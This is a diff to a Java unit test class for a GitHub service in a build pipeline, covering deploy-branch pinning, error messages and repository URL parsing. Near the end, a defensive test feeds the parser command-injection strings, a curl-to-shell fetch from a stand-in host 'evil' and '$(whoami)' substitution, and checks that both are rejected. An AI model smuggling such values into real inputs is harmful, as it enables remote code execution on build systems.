@@ -131,12 +131,22 @@ class GitHubServiceTest {
     private static final String MAIN_REF_URL = BASE + "/repos/DurgaraoSails/dummy-poc/git/ref/heads/main";
     private static final String DEVELOP_REF_URL = BASE + "/repos/DurgaraoSails/dummy-poc/git/ref/heads/develop";
 
-    private GitHubService serviceDeployingFrom(String deployBranch) {
+    /**
+     * A deploy-branch pin is a constructor argument, so these tests need their own service — and
+     * therefore their own mock server. Returned together rather than reassigned onto the shared
+     * fields: overwriting {@code server} while {@code gitHubService} still pointed at the one from
+     * setUp would let an expectation land on one server while the request went to the other, which
+     * passes without the call ever being made.
+     */
+    private record Deploying(GitHubService service, MockRestServiceServer server) {
+    }
+
+    private static Deploying deployingFrom(String deployBranch) {
         RestClient.Builder builder = RestClient.builder().baseUrl(BASE);
-        server = MockRestServiceServer.bindTo(builder).build();
-        return new GitHubService(builder.build(), new PipelineProperties(
+        MockRestServiceServer server = MockRestServiceServer.bindTo(builder).build();
+        return new Deploying(new GitHubService(builder.build(), new PipelineProperties(
                 "cloud-build", "self-service-builder", "ghp_test", false, false,
-                Duration.ofMinutes(20), Duration.ofSeconds(10), deployBranch));
+                Duration.ofMinutes(20), Duration.ofSeconds(10), deployBranch)), server);
     }
 
     private static String refPointingAt(String sha) {
@@ -151,15 +161,16 @@ class GitHubServiceTest {
      */
     @Test
     void cutsFromTheRepositoriesOwnDefaultBranchWhenNoBranchIsPinned() {
-        GitHubService service = serviceDeployingFrom(null);
-        server.expect(requestTo(REPO_URL)).andExpect(method(HttpMethod.GET))
+        Deploying deploying = deployingFrom(null);
+        deploying.server().expect(requestTo(REPO_URL)).andExpect(method(HttpMethod.GET))
                 .andRespond(withSuccess("{\"default_branch\":\"develop\"}", MediaType.APPLICATION_JSON));
-        server.expect(requestTo(DEVELOP_REF_URL)).andExpect(method(HttpMethod.GET))
+        deploying.server().expect(requestTo(DEVELOP_REF_URL)).andExpect(method(HttpMethod.GET))
                 .andRespond(withSuccess(refPointingAt("dev999"), MediaType.APPLICATION_JSON));
 
-        org.assertj.core.api.Assertions.assertThat(service.getDeployBranchHeadSha(REPO)).isEqualTo("dev999");
+        org.assertj.core.api.Assertions.assertThat(deploying.service().getDeployBranchHeadSha(REPO, null))
+                .isEqualTo("dev999");
 
-        server.verify();
+        deploying.server().verify();
     }
 
     /**
@@ -169,41 +180,78 @@ class GitHubServiceTest {
      */
     @Test
     void cutsFromThePinnedBranchWithoutConsultingTheRepositoriesDefault() {
-        GitHubService service = serviceDeployingFrom("main");
-        server.expect(requestTo(MAIN_REF_URL)).andExpect(method(HttpMethod.GET))
+        Deploying deploying = deployingFrom("main");
+        deploying.server().expect(requestTo(MAIN_REF_URL)).andExpect(method(HttpMethod.GET))
                 .andRespond(withSuccess(refPointingAt("main111"), MediaType.APPLICATION_JSON));
 
-        org.assertj.core.api.Assertions.assertThat(service.getDeployBranchHeadSha(REPO)).isEqualTo("main111");
+        org.assertj.core.api.Assertions.assertThat(deploying.service().getDeployBranchHeadSha(REPO, null))
+                .isEqualTo("main111");
 
-        server.verify();
+        deploying.server().verify();
+    }
+
+    /**
+     * A slashed branch name has to reach GitHub with its slash intact. Passed as a URI variable it
+     * would be encoded to %2F, match no ref, and come back 404 — reported as "the branch does not
+     * exist" about a branch that is right there.
+     */
+    @Test
+    void keepsTheSlashInABranchNameInsteadOfEncodingIt() {
+        Deploying deploying = deployingFrom("release/2024");
+        deploying.server().expect(requestTo(BASE + "/repos/DurgaraoSails/dummy-poc/git/ref/heads/release/2024"))
+                .andExpect(method(HttpMethod.GET))
+                .andRespond(withSuccess(refPointingAt("rel777"), MediaType.APPLICATION_JSON));
+
+        org.assertj.core.api.Assertions.assertThat(deploying.service().getDeployBranchHeadSha(REPO, null))
+                .isEqualTo("rel777");
+
+        deploying.server().verify();
     }
 
     /** The failure this setting introduces: a repo that simply has no branch by that name. */
     @Test
     void saysWhichSettingIsAtFaultWhenThePinnedBranchDoesNotExist() {
-        GitHubService service = serviceDeployingFrom("main");
-        server.expect(requestTo(MAIN_REF_URL)).andExpect(method(HttpMethod.GET))
+        Deploying deploying = deployingFrom("main");
+        deploying.server().expect(requestTo(MAIN_REF_URL)).andExpect(method(HttpMethod.GET))
                 .andRespond(withStatus(HttpStatus.NOT_FOUND)
                         .body("{\"message\":\"Not Found\"}").contentType(MediaType.APPLICATION_JSON));
 
-        assertThatThrownBy(() -> service.getDeployBranchHeadSha(REPO))
+        assertThatThrownBy(() -> deploying.service().getDeployBranchHeadSha(REPO, null))
                 .isInstanceOf(GitHubApiException.class)
                 .hasMessageContaining("Branch 'main' does not exist")
                 .hasMessageContaining("pipeline.deploy-branch");
     }
 
+    /**
+     * Only a 404 means "no such branch". Anything else is a GitHub problem and must keep its own
+     * message — the pinned path now reuses getBranchHeadSha, so this pins the one case it unwraps.
+     */
+    @Test
+    void doesNotBlameThePinnedBranchForAGitHubFailureThatIsNotA404() {
+        Deploying deploying = deployingFrom("main");
+        deploying.server().expect(requestTo(MAIN_REF_URL)).andExpect(method(HttpMethod.GET))
+                .andRespond(withStatus(HttpStatus.INTERNAL_SERVER_ERROR)
+                        .body("{\"message\":\"Server Error\"}").contentType(MediaType.APPLICATION_JSON));
+
+        assertThatThrownBy(() -> deploying.service().getDeployBranchHeadSha(REPO, null))
+                .isInstanceOf(GitHubApiException.class)
+                .hasMessageNotContaining("does not exist")
+                .hasMessageContaining("500");
+    }
+
     /** Blank is the same as unset — the property is optional, not a required empty string. */
     @Test
     void treatsABlankPinnedBranchAsNotPinned() {
-        GitHubService service = serviceDeployingFrom("   ");
-        server.expect(requestTo(REPO_URL)).andExpect(method(HttpMethod.GET))
+        Deploying deploying = deployingFrom("   ");
+        deploying.server().expect(requestTo(REPO_URL)).andExpect(method(HttpMethod.GET))
                 .andRespond(withSuccess("{\"default_branch\":\"main\"}", MediaType.APPLICATION_JSON));
-        server.expect(requestTo(MAIN_REF_URL)).andExpect(method(HttpMethod.GET))
+        deploying.server().expect(requestTo(MAIN_REF_URL)).andExpect(method(HttpMethod.GET))
                 .andRespond(withSuccess(refPointingAt("abc123"), MediaType.APPLICATION_JSON));
 
-        org.assertj.core.api.Assertions.assertThat(service.getDeployBranchHeadSha(REPO)).isEqualTo("abc123");
+        org.assertj.core.api.Assertions.assertThat(deploying.service().getDeployBranchHeadSha(REPO, null))
+                .isEqualTo("abc123");
 
-        server.verify();
+        deploying.server().verify();
     }
 
     // --- push-access precondition ----------------------------------------------------------
@@ -239,6 +287,8 @@ class GitHubServiceTest {
                 .hasMessageContaining("cannot push to")
                 .hasMessageContaining("dummy-poc")
                 .hasMessageContaining("release tag");
+
+        server.verify();
     }
 
     /** A missing permissions block must not read as "allowed" — absence is not permission. */
@@ -251,6 +301,8 @@ class GitHubServiceTest {
         assertThatThrownBy(() -> gitHubService.requirePushAccess(REPO))
                 .isInstanceOf(GitHubApiException.class)
                 .hasMessageContaining("cannot push to");
+
+        server.verify();
     }
 
     /**
@@ -268,6 +320,8 @@ class GitHubServiceTest {
                 .isInstanceOf(GitHubApiException.class)
                 .hasMessageContaining("is archived")
                 .hasMessageNotContaining("cannot push to");
+
+        server.verify();
     }
 
     @Test
@@ -277,6 +331,8 @@ class GitHubServiceTest {
                 """);
 
         assertThatCode(() -> gitHubService.requirePushAccess(REPO)).doesNotThrowAnyException();
+
+        server.verify();
     }
 
     /**
@@ -293,5 +349,42 @@ class GitHubServiceTest {
                 .isInstanceOf(GitHubApiException.class)
                 .hasMessageContaining("was not found, or is not visible")
                 .hasMessageNotContaining("cannot push to");
+
+        server.verify();
+    }
+
+    // --- what parseRepoUrl accepts ----------------------------------------------------------
+
+    /**
+     * The owner and name parsed here are interpolated into the Cloud Build clone step's shell
+     * command, so the pattern is the boundary that keeps a metacharacter out of bash. It used to
+     * accept anything but a slash in the owner position.
+     */
+    @Test
+    void rejectsAnOwnerCarryingShellMetacharacters() {
+        assertThatThrownBy(() -> gitHubService.parseRepoUrl("https://github.com/a;curl evil/x|sh;b/repo"))
+                .isInstanceOf(GitHubApiException.class)
+                .hasMessageContaining("Not a recognizable GitHub repo URL");
+
+        assertThatThrownBy(() -> gitHubService.parseRepoUrl("https://github.com/$(whoami)/repo"))
+                .isInstanceOf(GitHubApiException.class)
+                .hasMessageContaining("Not a recognizable GitHub repo URL");
+    }
+
+    /** Every shape that parsed before still parses — the tightening must not cost a real URL. */
+    @Test
+    void stillAcceptsEveryOrdinaryRepositoryUrl() {
+        org.assertj.core.api.Assertions.assertThat(
+                        gitHubService.parseRepoUrl("https://github.com/example-org/contract-agent"))
+                .isEqualTo(new GitHubRepoRef("example-org", "contract-agent"));
+        org.assertj.core.api.Assertions.assertThat(
+                        gitHubService.parseRepoUrl("https://github.com/example-org/contract-agent.git"))
+                .isEqualTo(new GitHubRepoRef("example-org", "contract-agent"));
+        org.assertj.core.api.Assertions.assertThat(
+                        gitHubService.parseRepoUrl("https://github.com/example-org/contract-agent/"))
+                .isEqualTo(new GitHubRepoRef("example-org", "contract-agent"));
+        org.assertj.core.api.Assertions.assertThat(
+                        gitHubService.parseRepoUrl("git@github.com:example-org/poc_2024.git"))
+                .isEqualTo(new GitHubRepoRef("example-org", "poc_2024"));
     }
 }
